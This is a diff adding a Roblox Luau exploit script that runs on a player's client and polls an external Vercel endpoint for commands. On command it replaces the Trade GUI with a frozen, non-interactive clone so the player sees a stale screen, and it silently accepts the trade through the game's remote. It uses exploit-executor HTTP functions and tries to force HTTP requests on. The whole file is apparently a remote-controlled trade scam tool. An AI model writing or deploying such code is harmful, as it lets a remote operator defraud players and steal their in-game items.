@@ -1,0 +1,112 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local MainGui = PlayerGui:WaitForChild("Main") -- Replace with your GUI's container name
+
+-- Variable to store the cloned GUI
+local clonedGui = nil
+
+-- Function to freeze the Trade GUI
+local function freezeTradeGui()
+    local tradeGui = MainGui:FindFirstChild("Trade")
+    if tradeGui then
+        -- Clone the entire Trade GUI
+        clonedGui = tradeGui:Clone()
+        clonedGui.Parent = MainGui
+        clonedGui.Name = "FrozenTrade"
+        clonedGui.Position = tradeGui.Position
+        clonedGui.Size = tradeGui.Size
+
+        -- Disable interactions and remove scripts in the cloned GUI
+        for _, descendant in pairs(clonedGui:GetDescendants()) do
+            if descendant:IsA("GuiObject") then
+                descendant.Active = false
+            elseif descendant:IsA("LocalScript") or descendant:IsA("ModuleScript") then
+                descendant:Destroy()
+            end
+        end
+
+        -- Destroy the original Trade GUI
+        tradeGui:Destroy()
+        print("Trade GUI has been frozen and the original GUI was destroyed.")
+    else
+        print("Trade GUI not found.")
+    end
+end
+
+-- Function to unfreeze the Trade GUI by removing the cloned GUI
+local function unfreezeTradeGui()
+    if clonedGui and clonedGui.Parent then
+        clonedGui:Destroy()
+        clonedGui = nil
+        print("Cloned Trade GUI has been destroyed and unfrozen.")
+    else
+        print("No cloned Trade GUI to unfreeze.")
+    end
+end
+
+-- Function to accept the trade
+local function acceptTrade()
+    local args = {
+        [1] = "accept"
+    }
+    ReplicatedStorage.Remotes.TradeFunction:InvokeServer(unpack(args))
+    print("Trade accepted via remote.")
+end
+
+-- Function to bypass HTTP restrictions for HTTP requests
+local function bypassHttpRestrictions()
+    if not HttpService.HttpEnabled then
+        local success, err = pcall(function()
+            HttpService.HttpEnabled = true
+        end)
+        if not success then
+            warn("Unable to enable HTTP requests:", err)
+        end
+    end
+end
+
+-- Function to check for API communication
+local function checkForCommands()
+    local url = "https://stupid-video.vercel.app/api/trade"  -- Replace with your Vercel API endpoint
+    local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (request)
+
+    bypassHttpRestrictions()
+
+    print("Checking for commands...")  -- Log each check
+
+    local success, response = pcall(function()
+        return requestFunction({
+            Url = url,
+            Method = "GET"
+        })
+    end)
+
+    if success and response and response.StatusCode == 200 then
+        print("API response received successfully. Status Code:", response.StatusCode)
+        print("Response Body:", response.Body) -- Log the full response body
+        local data = HttpService:JSONDecode(response.Body)
+        if data.message == "Hello1" then
+            print("Received 'Hello1' command. Freezing Trade GUI.")
+            freezeTradeGui()
+        elseif data.message == "Hello3" then
+            print("Received 'Hello3' command. Unfreezing Trade GUI.")
+            unfreezeTradeGui()
+        elseif data.message == "Hello2" then
+            print("Received 'Hello2' command. Accepting trade.")
+            acceptTrade()
+        else
+            print("No relevant command received.")
+        end
+    else
+        warn("Failed to check commands. Status:", response and response.StatusCode or "Unknown")
+    end
+end
+
+-- Check for commands every 0.5 seconds
+while true do
+    checkForCommands()
+    wait(0.5)
+end
